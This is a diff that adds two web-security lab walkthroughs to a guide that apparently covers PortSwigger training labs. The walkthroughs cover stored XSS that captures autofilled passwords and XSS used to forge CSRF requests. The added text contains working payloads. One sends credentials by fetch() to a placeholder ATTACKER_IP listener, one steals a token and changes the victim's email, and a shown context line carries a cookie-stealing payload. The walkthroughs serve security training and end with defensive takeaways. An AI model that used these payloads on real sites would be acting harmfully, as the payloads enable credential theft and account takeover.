@@ -608,3 +608,91 @@ new Image().src = 'http://ATTACKER_IP:8080/?cookie=' + encodeURIComponent(docume
 7. Refresh or navigate to `/my-account` to confirm successful session hijacking under the victim's identity.
 
 > **Key Takeaway:** Stored XSS combined with accessible `document.cookie` values allows complete session hijacking. The primary defense is enforcing the `HttpOnly` attribute on all sensitive session cookies to block JavaScript DOM access, combined with strict output encoding and a Content Security Policy (CSP) restricting outbound connection destinations (`connect-src` / `img-src`).
+
+---
+
+### [PS-XSS-17] Exploiting cross-site scripting to capture passwords (Non-Collaborator Solution)
+
+**Scenario:** The application contains a stored XSS vulnerability in the blog comments function. When a user posts a comment, it is rendered unsanitized to all subsequent visitors—including a simulated victim/admin user. Modern web browsers automatically populate saved user credentials into standard HTML credential inputs (`<input name=username>` and `<input type=password>`), even outside a formal `<form>` container. By injecting arbitrary input tags combined with an `onchange` script handler, an attacker can force browser autofill and exfiltrate the victim's plaintext credentials via an asynchronous `fetch()` POST request to an attacker-controlled HTTP listener (such as a local Python server or `interactsh` instance) for direct authentication takeover.
+
+**Solution:**
+
+1. Open a terminal on your attacking machine (e.g., Kali Linux) and start a lightweight HTTP server on an accessible port (or launch `interactsh-client` for public OAST testing):
+
+```bash
+python3 -m http.server 8080
+
+```
+
+2. Navigate to a blog post on the target application and submit a comment containing fake input elements configured to exfiltrate captured values. Replace `ATTACKER_IP` with your machine's VPN/network IP or OAST domain:
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('http://ATTACKER_IP:8080/',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
+
+```
+
+3. Submit the comment. When the victim views the comment section, their browser password manager automatically populates the input fields, triggering the `onchange` event listener.
+4. Check your terminal logs for the incoming `POST` request containing the extracted credentials in the body payload:
+
+```text
+10.10.x.x - - [01/Sep/2026 18:15:00] "POST / HTTP/1.1" 200 -
+Body: administrator:P@ssword123!
+
+```
+
+5. Copy the extracted credentials from the terminal output.
+6. Navigate to `/login` on the target application.
+7. Enter the captured username (`administrator`) and password (`P@ssword123!`) to gain administrative access and complete the lab.
+
+> **Key Takeaway:** Password manager autofill heuristics scan the DOM for standard credential attribute names regardless of surrounding HTML structures. Combining stored XSS with synthetic input injection allows attackers to covertly extract saved plaintext passwords. Mitigations include strict contextual HTML encoding, restricting outbound network calls via Content Security Policy (`connect-src`), and enforcing multi-factor authentication (MFA).
+
+---
+
+### [PS-XSS-18] Exploiting cross-site scripting to perform CSRF
+
+**Scenario:** The application contains a stored XSS vulnerability in the blog comments function. Sensitive user state-changing actions (such as updating an email address at `/my-account/change-email`) are protected against Cross-Site Request Forgery (CSRF) via anti-CSRF tokens. Because XSS executes scripts directly inside the target application's origin, Same-Origin Policy (SOP) restrictions do not apply. An attacker can write an XSS payload that reads the victim's fresh anti-CSRF token directly from their session DOM and issues an authenticated POST request to change the victim's email address without needing external network exfiltration.
+
+---
+
+**Solution:**
+
+1. Log into your provided low-privilege account (`wiener:peter`) and navigate to `/my-account` to inspect the email change feature.
+2. Note the target endpoint (`/my-account/change-email`) and observe the hidden CSRF token input field in the form source:
+```html
+<input type="hidden" name="csrf" value="dY1...token">
+
+```
+
+
+3. Draft a JavaScript payload that performs an asynchronous two-step execution:
+* **Step A:** Fetch `/my-account` via `GET` to obtain a fresh DOM copy containing the victim's CSRF token.
+* **Step B:** Parse the token string and execute a `POST` request to `/my-account/change-email` supplying the stolen token alongside the new target email address.
+
+
+4. Submit the following script payload into a blog comment:
+
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = function() {
+    var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('POST', '/my-account/change-email', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf=' + encodeURIComponent(token) + '&email=attacker@evil-user.net');
+};
+req.open('GET', '/my-account', true);
+req.send();
+</script>
+
+```
+
+5. Post the comment on any blog page.
+6. Wait 10–15 seconds for the automated victim administrator bot to view the comment section.
+7. The script will automatically trigger in the bot's browser context, reading their administrative CSRF token and forcing their account email to update to `attacker@evil-user.net`.
+8. The lab will automatically update to **SOLVED**.
+
+---
+
+> **Key Takeaway:** Anti-CSRF tokens offer zero protection against Same-Origin attacks. Because XSS grants full access to the target origin's DOM under the victim's session, an attacker can easily read dynamically generated CSRF tokens, bypass state-change defenses, and execute arbitrary user actions. Defending against CSRF requires robust XSS prevention (contextual output encoding, strict input validation, and CSP) as a foundational prerequisite.
